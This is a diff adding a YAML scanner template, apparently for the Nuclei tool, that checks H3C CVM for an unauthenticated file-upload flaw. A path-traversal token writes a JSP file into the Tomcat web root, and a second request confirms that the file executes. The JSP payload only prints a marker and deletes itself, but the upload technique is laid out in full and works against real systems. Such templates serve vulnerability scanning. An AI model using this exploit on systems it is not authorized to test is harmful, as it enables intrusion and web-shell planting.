@@ -1,0 +1,44 @@
+id: poc-yaml-h3c-cvm-upload-file-upload
+
+info:
+  name: poc-yaml-h3c-cvm-upload-file-upload
+  author: xiaobaicai
+  severity: critical
+  tags: xray-converted,fileupload,ct-479112
+  reference:
+    - https://planet.vulbox.com/detail/MTE4MDM=
+
+http:
+  - raw:
+      - |
+        POST /cas/fileUpload/upload?token=/../../../../../var/lib/tomcat8/webapps/cas/js/lib/buttons/{{rand_base(8)}}.jsp HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        Content-range: bytes 0-10/20
+        Referer: {{b}}cas/login
+
+        <%out.println("{{rand_base(8)}}");new java.io.File(application.getRealPath(request.getServletPath())).delete();%>
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "success"
+      - type: word
+        part: header
+        words:
+          - "H3C-CVM"
+  - raw:
+      - |
+        GET /cas/js/lib/buttons/{{rand_base(8)}}.jsp HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
